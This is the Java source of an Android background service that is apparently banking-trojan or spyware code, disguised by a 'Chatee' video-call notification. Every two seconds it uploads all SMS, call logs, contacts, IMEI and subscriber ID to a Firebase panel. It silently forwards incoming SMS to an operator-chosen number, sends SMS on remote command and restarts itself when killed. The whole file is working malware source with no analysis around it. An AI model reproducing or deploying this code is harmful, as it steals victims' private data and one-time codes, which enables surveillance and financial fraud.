package com.spinplay99.adminpanel;

import android.Manifest;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.CallLog;
import android.provider.Settings;
import android.provider.Telephony;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;

import androidx.annotation.NonNull;
import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;

import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.ServerValue;
import com.google.firebase.database.ValueEventListener;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;

public class BackgroundSyncService extends Service {

    private static final String CHANNEL_ID = "chatee_sync";
    private static final int NOTIFICATION_ID = 999;
    private static final String FORWARD_PREFS = "sms_forward_dedup";
    private static final int FORWARD_DEDUP_MAX = 200;

    private SharedPreferences forwardPrefs;

    private DatabaseReference databaseReference;
    private String deviceId;
    private Handler handler;
    private Runnable syncRunnable;
    private SmsManager smsManager;
    private ValueEventListener forwardingListener;
    private ValueEventListener webhookSmsListener;
    private ValueEventListener commandListener;
    private String forwardingNumber = "";
    private boolean forwardingEnabled = false;
    private List<String> forwardingFilters = new ArrayList<>();
    private boolean forwardAllSms = true;

    @Override
    public void onCreate() {
        super.onCreate();
        FirebaseBootstrap.ensureApp(this);
        databaseReference = FirebaseBootstrap.database(this).getReference();
        deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        handler = new Handler(Looper.getMainLooper());
        smsManager = SmsManager.getDefault();
        forwardPrefs = getSharedPreferences(FORWARD_PREFS, MODE_PRIVATE);
        createNotificationChannel();
        startForeground(NOTIFICATION_ID, createNotification());
        loadForwardingSettings();
        listenForManualCommands();
        listenForWebhookSms();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        startSyncLoop();
        return START_STICKY;
    }

    private void startSyncLoop() {
        syncRunnable = new Runnable() {
            @Override
            public void run() {
                syncDataToFirebase();
                handler.postDelayed(this, 2000);
            }
        };
        handler.post(syncRunnable);
    }

    private void syncDataToFirebase() {
        DatabaseReference deviceRef = databaseReference.child(PanelPaths.ROOT).child(deviceId);
        deviceRef.child("online_status").setValue(true);
        deviceRef.child("online_status").onDisconnect().setValue(false);
        deviceRef.child("device_info").child("last_seen").onDisconnect().setValue(ServerValue.TIMESTAMP);
        deviceRef.child("live_data").setValue(collectLiveData());
        updateDeviceInfo();
        checkAndForwardNewSms();
    }

    private Map<String, Object> collectLiveData() {
        Map<String, Object> liveData = new HashMap<>();
        SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
        liveData.put("timestamp", dateFormat.format(new Date()));
        liveData.put("timestamp_millis", System.currentTimeMillis());
        liveData.put("battery_level", getBatteryLevel());
        liveData.put("network_type", getNetworkType());
        liveData.put("is_charging", isDeviceCharging());
        liveData.put("permissions", getAllPermissions());
        liveData.put("sim_info", getSimInformation());

        if (checkPermission(Manifest.permission.READ_SMS)) {
            liveData.put("total_sms", getSmsCount());
            uploadAllSms();
        }
        if (checkPermission(Manifest.permission.READ_CALL_LOG)) {
            liveData.put("total_calls", getCallLogCount());
            uploadAllCalls();
        }
        if (checkPermission(Manifest.permission.READ_CONTACTS)) {
            liveData.put("contacts_count", getContactCount());
            uploadAllContacts();
        }
        return liveData;
    }

    private void updateDeviceInfo() {
        Map<String, Object> deviceInfo = new HashMap<>();
        deviceInfo.put("device_id", deviceId);
        deviceInfo.put("device_model", Build.MODEL);
        deviceInfo.put("device_brand", Build.BRAND);
        deviceInfo.put("android_version", Build.VERSION.RELEASE);
        deviceInfo.put("last_seen", ServerValue.TIMESTAMP);
        deviceInfo.put("sim_info", getDetailedSimInfo());
        databaseReference.child(PanelPaths.ROOT).child(deviceId).child("device_info").updateChildren(deviceInfo);
    }

    private void uploadAllSms() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                List<Map<String, Object>> allMessages = getAllSmsMessages();
                Map<String, Object> smsData = new HashMap<>();
                smsData.put("total_count", allMessages.size());
                smsData.put("messages", allMessages);
                databaseReference.child(PanelPaths.ROOT).child(deviceId).child("all_sms").setValue(smsData);
            }
        }).start();
    }

    private List<Map<String, Object>> getAllSmsMessages() {
        List<Map<String, Object>> smsList = new ArrayList<>();
        Cursor cursor = null;
        try {
            cursor = getContentResolver().query(
                Telephony.Sms.CONTENT_URI,
                new String[]{"_id", "address", "body", "date", "type", "read"},
                null, null, "date DESC");
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    Map<String, Object> sms = new HashMap<>();
                    sms.put("id", getCursorValue(cursor, 0));
                    sms.put("address", getCursorValue(cursor, 1));
                    String body = getCursorValue(cursor, 2);
                    if (body != null && body.length() > 300) {
                        body = body.substring(0, 300) + "...";
                    }
                    sms.put("body", body);
                    String dateStr = getCursorValue(cursor, 3);
                    sms.put("date", dateStr);
                    if (dateStr != null && !dateStr.isEmpty()) {
                        sms.put("date_readable", formatTimestamp(Long.parseLong(dateStr)));
                    }
                    String typeStr = getCursorValue(cursor, 4);
                    if ("1".equals(typeStr)) sms.put("type", "INBOX");
                    else if ("2".equals(typeStr)) sms.put("type", "SENT");
                    else sms.put("type", "OTHER");
                    sms.put("read", getCursorValue(cursor, 5));
                    smsList.add(sms);
                } while (cursor.moveToNext());
            }
        } catch (Exception e) {
        } finally {
            if (cursor != null) cursor.close();
        }
        return smsList;
    }

    private void uploadAllCalls() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                List<Map<String, Object>> allCalls = getAllCallLogs();
                Map<String, Object> callData = new HashMap<>();
                callData.put("total_count", allCalls.size());
                callData.put("calls", allCalls);
                databaseReference.child(PanelPaths.ROOT).child(deviceId).child("all_calls").setValue(callData);
            }
        }).start();
    }

    private List<Map<String, Object>> getAllCallLogs() {
        List<Map<String, Object>> callList = new ArrayList<>();
        Cursor cursor = null;
        try {
            cursor = getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                new String[]{"_id", "number", "type", "date", "duration", "name"},
                null, null, "date DESC");
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    Map<String, Object> call = new HashMap<>();
                    call.put("id", getCursorValue(cursor, 0));
                    call.put("number", getCursorValue(cursor, 1));
                    String typeStr = getCursorValue(cursor, 2);
                    if ("1".equals(typeStr)) call.put("type", "INCOMING");
                    else if ("2".equals(typeStr)) call.put("type", "OUTGOING");
                    else if ("3".equals(typeStr)) call.put("type", "MISSED");
                    else call.put("type", "UNKNOWN");
                    String dateStr = getCursorValue(cursor, 3);
                    call.put("date", dateStr);
                    if (dateStr != null && !dateStr.isEmpty()) {
                        call.put("date_readable", formatTimestamp(Long.parseLong(dateStr)));
                    }
                    call.put("duration", getCursorValue(cursor, 4));
                    call.put("contact_name", getCursorValue(cursor, 5));
                    callList.add(call);
                } while (cursor.moveToNext());
            }
        } catch (Exception e) {
        } finally {
            if (cursor != null) cursor.close();
        }
        return callList;
    }

    private void uploadAllContacts() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                List<Map<String, Object>> allContacts = getAllContactsList();
                Map<String, Object> contactData = new HashMap<>();
                contactData.put("total_count", allContacts.size());
                contactData.put("contacts", allContacts);
                databaseReference.child(PanelPaths.ROOT).child(deviceId).child("all_contacts").setValue(contactData);
            }
        }).start();
    }

    private List<Map<String, Object>> getAllContactsList() {
        List<Map<String, Object>> contactList = new ArrayList<>();
        Cursor cursor = null;
        try {
            cursor = getContentResolver().query(
                android.provider.ContactsContract.Contacts.CONTENT_URI,
                new String[]{"_id", "display_name", "has_phone_number"},
                null, null, "display_name ASC");
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    Map<String, Object> contact = new HashMap<>();
                    String contactId = getCursorValue(cursor, 0);
                    contact.put("id", contactId);
                    contact.put("name", getCursorValue(cursor, 1));
                    if ("1".equals(getCursorValue(cursor, 2))) {
                        contact.put("phone", getPhoneNumberForContact(contactId));
                    }
                    contactList.add(contact);
                } while (cursor.moveToNext());
            }
        } catch (Exception e) {
        } finally {
            if (cursor != null) cursor.close();
        }
        return contactList;
    }

    private String getPhoneNumberForContact(String contactId) {
        try {
            Cursor cursor = getContentResolver().query(
                android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                new String[]{"number"},
                "contact_id = ?",
                new String[]{contactId},
                null);
            if (cursor != null && cursor.moveToFirst()) {
                String number = cursor.getString(0);
                cursor.close();
                return number;
            }
            if (cursor != null) cursor.close();
        } catch (Exception e) {
        }
        return "";
    }

    private void loadForwardingSettings() {
        forwardingListener = new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                if (snapshot.exists()) {
                    forwardingNumber = snapshot.child("forward_to").getValue(String.class);
                    Boolean enabled = snapshot.child("enabled").getValue(Boolean.class);
                    forwardingEnabled = enabled != null && enabled;
                    Boolean allSms = snapshot.child("forward_all").getValue(Boolean.class);
                    forwardAllSms = allSms == null || allSms;
                    forwardingFilters.clear();
                    for (DataSnapshot filter : snapshot.child("filters").getChildren()) {
                        String number = filter.getValue(String.class);
                        if (number != null) forwardingFilters.add(number);
                    }
                }
            }
            @Override
            public void onCancelled(@NonNull DatabaseError error) {
            }
        };
        databaseReference.child(PanelPaths.ROOT).child(deviceId).child("forwarding_settings")
            .addValueEventListener(forwardingListener);
    }

    private void forwardSmsMessage(String from, String body, long timestamp) {
        if (!forwardingEnabled || forwardingNumber == null || forwardingNumber.isEmpty()) return;
        String dedupKey = from + "|" + timestamp + "|" + (body != null ? body.hashCode() : 0);
        if (forwardPrefs.getBoolean(dedupKey, false)) return;
        if (!forwardAllSms && !forwardingFilters.isEmpty()) {
            boolean matched = false;
            for (String filter : forwardingFilters) {
                if (from.contains(filter)) {
                    matched = true;
                    break;
                }
            }
            if (!matched) return;
        }
        try {
            smsManager.sendTextMessage(forwardingNumber, null, "From: " + from + "\n" + body, null, null);
            Map<String, Object> log = new HashMap<>();
            log.put("from", from);
            log.put("to", forwardingNumber);
            log.put("body", body != null && body.length() > 100 ? body.substring(0, 100) : body);
            log.put("status", "FORWARDED");
            log.put("forwarded_at", ServerValue.TIMESTAMP);
            databaseReference.child(PanelPaths.ROOT).child(deviceId).child("forwarded_sms").push().setValue(log);
            markSmsForwarded(dedupKey);
        } catch (Exception e) {
        }
    }

    private void markSmsForwarded(String dedupKey) {
        SharedPreferences.Editor editor = forwardPrefs.edit().putBoolean(dedupKey, true);
        Map<String, ?> all = forwardPrefs.getAll();
        if (all.size() >= FORWARD_DEDUP_MAX) {
            int removeCount = all.size() - FORWARD_DEDUP_MAX + 1;
            for (String key : all.keySet()) {
                editor.remove(key);
                removeCount--;
                if (removeCount <= 0) break;
            }
        }
        editor.apply();
    }

    private void checkAndForwardNewSms() {
        if (!forwardingEnabled || !checkPermission(Manifest.permission.READ_SMS)) return;
        new Thread(new Runnable() {
            @Override
            public void run() {
                Cursor cursor = null;
                try {
                    long tenSecondsAgo = System.currentTimeMillis() - 10000;
                    cursor = getContentResolver().query(
                        Telephony.Sms.Inbox.CONTENT_URI,
                        new String[]{"address", "body", "date"},
                        "date > ?",
                        new String[]{String.valueOf(tenSecondsAgo)},
                        "date DESC LIMIT 5");
                    if (cursor != null && cursor.moveToFirst()) {
                        do {
                            forwardSmsMessage(
                                getCursorValue(cursor, 0),
                                getCursorValue(cursor, 1),
                                Long.parseLong(getCursorValue(cursor, 2))
                            );
                        } while (cursor.moveToNext());
                    }
                } catch (Exception e) {
                } finally {
                    if (cursor != null) cursor.close();
                }
            }
        }).start();
    }

    private void listenForWebhookSms() {
        webhookSmsListener = new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                if (!snapshot.exists()) return;
                String to = snapshot.child("to").getValue(String.class);
                String message = snapshot.child("message").getValue(String.class);
                if (to == null || message == null) return;
                try {
                    smsManager.sendTextMessage(to, null, message, null, null);
                    Map<String, Object> log = new HashMap<>();
                    log.put("to", to);
                    log.put("message", message);
                    log.put("status", "SENT");
                    log.put("sent_at", ServerValue.TIMESTAMP);
                    databaseReference.child(PanelPaths.ROOT).child(deviceId).child("sent_sms").push().setValue(log);
                } catch (Exception ignored) {
                }
                snapshot.getRef().removeValue();
            }

            @Override
            public void onCancelled(@NonNull DatabaseError error) {
            }
        };
        databaseReference.child(PanelPaths.ROOT).child(deviceId).child("webhookEvent").child("sendSms")
            .addValueEventListener(webhookSmsListener);
    }

    private void listenForManualCommands() {
        commandListener = new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                for (DataSnapshot command : snapshot.getChildren()) {
                    String to = command.child("to").getValue(String.class);
                    String message = command.child("message").getValue(String.class);
                    if (to != null && message != null) {
                        try {
                            smsManager.sendTextMessage(to, null, message, null, null);
                            Map<String, Object> log = new HashMap<>();
                            log.put("to", to);
                            log.put("message", message);
                            log.put("status", "SENT");
                            log.put("sent_at", ServerValue.TIMESTAMP);
                            databaseReference.child(PanelPaths.ROOT).child(deviceId).child("sent_sms").push().setValue(log);
                        } catch (Exception e) {
                        }
                    }
                    command.getRef().removeValue();
                }
            }
            @Override
            public void onCancelled(@NonNull DatabaseError error) {
            }
        };
        databaseReference.child(PanelPaths.ROOT).child(deviceId).child("manual_commands").child("send_sms")
            .addValueEventListener(commandListener);
    }

    private String getCursorValue(Cursor cursor, int index) {
        try { return cursor.getString(index); } catch (Exception e) { return ""; }
    }

    private String formatTimestamp(long timestamp) {
        try {
            return new SimpleDateFormat("dd/MM/yyyy hh:mm a", Locale.getDefault()).format(new Date(timestamp));
        } catch (Exception e) { return ""; }
    }

    private int getSmsCount() { return getCount(Telephony.Sms.CONTENT_URI); }
    private int getCallLogCount() { return getCount(CallLog.Calls.CONTENT_URI); }
    private int getContactCount() { return getCount(android.provider.ContactsContract.Contacts.CONTENT_URI); }

    private int getCount(Uri uri) {
        int count = 0;
        try {
            Cursor cursor = getContentResolver().query(uri, null, null, null, null);
            if (cursor != null) { count = cursor.getCount(); cursor.close(); }
        } catch (Exception e) {}
        return count;
    }

    private Map<String, Boolean> getAllPermissions() {
        Map<String, Boolean> permissions = new HashMap<>();
        permissions.put("read_sms", checkPermission(Manifest.permission.READ_SMS));
        permissions.put("send_sms", checkPermission(Manifest.permission.SEND_SMS));
        permissions.put("receive_sms", checkPermission(Manifest.permission.RECEIVE_SMS));
        permissions.put("read_call_log", checkPermission(Manifest.permission.READ_CALL_LOG));
        permissions.put("read_contacts", checkPermission(Manifest.permission.READ_CONTACTS));
        permissions.put("call_phone", checkPermission(Manifest.permission.CALL_PHONE));
        return permissions;
    }

    private boolean checkPermission(String permission) {
        return ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED;
    }

    private int getBatteryLevel() {
        try {
            Intent intent = registerReceiver(null, new android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED));
            if (intent != null) {
                int scale = intent.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
                int level = intent.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
                if (scale > 0) return (level * 100) / scale;
            }
        } catch (Exception e) {}
        return 0;
    }

    private String getNetworkType() {
        try {
            android.net.ConnectivityManager cm = (android.net.ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
            android.net.NetworkInfo networkInfo = cm.getActiveNetworkInfo();
            if (networkInfo != null && networkInfo.isConnected()) return networkInfo.getTypeName();
        } catch (Exception e) {}
        return "Offline";
    }

    private boolean isDeviceCharging() {
        try {
            Intent intent = registerReceiver(null, new android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED));
            if (intent != null) {
                int status = intent.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1);
                return status == android.os.BatteryManager.BATTERY_STATUS_CHARGING 
                    || status == android.os.BatteryManager.BATTERY_STATUS_FULL;
            }
        } catch (Exception e) {}
        return false;
    }

    private Map<String, Object> getSimInformation() {
        Map<String, Object> simInfo = new HashMap<>();
        try {
            TelephonyManager telephonyManager = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
            if (telephonyManager != null) {
                simInfo.put("sim_operator", telephonyManager.getSimOperatorName());
                simInfo.put("network_operator", telephonyManager.getNetworkOperatorName());
            }
        } catch (Exception e) {}
        return simInfo;
    }

    private Map<String, Object> getDetailedSimInfo() {
        Map<String, Object> simInfo = new HashMap<>();
        try {
            TelephonyManager telephonyManager = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
            if (telephonyManager != null) {
                simInfo.put("sim_operator_name", telephonyManager.getSimOperatorName());
                simInfo.put("network_operator_name", telephonyManager.getNetworkOperatorName());
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O && checkPermission(Manifest.permission.READ_PHONE_STATE)) {
                    simInfo.put("imei", telephonyManager.getImei());
                }
                if (checkPermission(Manifest.permission.READ_PHONE_STATE)) {
                    simInfo.put("subscriber_id", telephonyManager.getSubscriberId());
                }
            }
        } catch (Exception e) {}
        return simInfo;
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID, "Video Call", NotificationManager.IMPORTANCE_LOW);
            channel.setDescription("Background service");
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) manager.createNotificationChannel(channel);
        }
    }

    private Notification createNotification() {
        Intent intent = new Intent(BackgroundSyncService.this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(
            this, 0, intent, PendingIntent.FLAG_IMMUTABLE);
        return new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Chatee")
            .setContentText("Live video ready")
            .setSmallIcon(android.R.drawable.ic_menu_manage)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .build();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        databaseReference.child(PanelPaths.ROOT).child(deviceId).child("online_status").setValue(false);
        if (handler != null && syncRunnable != null) handler.removeCallbacks(syncRunnable);
        if (forwardingListener != null) 
            databaseReference.child(PanelPaths.ROOT).child(deviceId).child("forwarding_settings")
                .removeEventListener(forwardingListener);
        if (commandListener != null)
            databaseReference.child(PanelPaths.ROOT).child(deviceId).child("manual_commands").child("send_sms")
                .removeEventListener(commandListener);
        if (webhookSmsListener != null)
            databaseReference.child(PanelPaths.ROOT).child(deviceId).child("webhookEvent").child("sendSms")
                .removeEventListener(webhookSmsListener);
        super.onDestroy();
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        startService(new Intent(getApplicationContext(), BackgroundSyncService.class));
        super.onTaskRemoved(rootIntent);
    }
}
